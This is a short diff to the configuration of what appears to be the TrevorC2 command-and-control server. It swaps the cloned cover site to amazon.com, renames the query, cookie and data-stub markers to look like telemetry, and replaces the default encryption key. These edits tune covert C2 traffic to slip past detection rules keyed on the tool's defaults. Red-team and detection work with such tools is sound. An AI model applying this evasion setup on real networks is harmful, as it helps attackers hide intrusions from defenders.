@@ -14,7 +14,7 @@ via a query string parameter.
 
 # CONFIG CONSTANTS:
 
-URL = "https://www.google.com"  # URL to clone to house a legitimate website
+URL = "https://www.amazon.com"  # URL to clone to house a legitimate website
 USER_AGENT = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
@@ -24,16 +24,16 @@ ROOT_PATH_QUERY = "/"
 SITE_PATH_QUERY = "/images"
 
 # THIS IS THE QUERY STRING PARAMETER USED
-QUERY_STRING = "guid="
+QUERY_STRING = "rid="
 
 # THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONID
-COOKIE_SESSIONID_STRING = "sessionid"
+COOKIE_SESSIONID_STRING = "slot"
 
 # THIS IS THE LENGTH OF THE COMMUNICATION SESSIONID
-COOKIE_SESSIONID_LENGTH = 15
+COOKIE_SESSIONID_LENGTH = 16
 
 # STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
-STUB = "oldcss="
+STUB = "telem="
 
 # Turn to True for SSL support
 SSL = False
@@ -42,7 +42,7 @@ KEY_FILE = ""
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION.
 # RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
-CIPHER = "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget"
+CIPHER = "DYZAWXPCghaFGmzVT3wQKUZbkrDZurdZHfHy"
 
 # Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
 NOTFOUND = "Page not found."
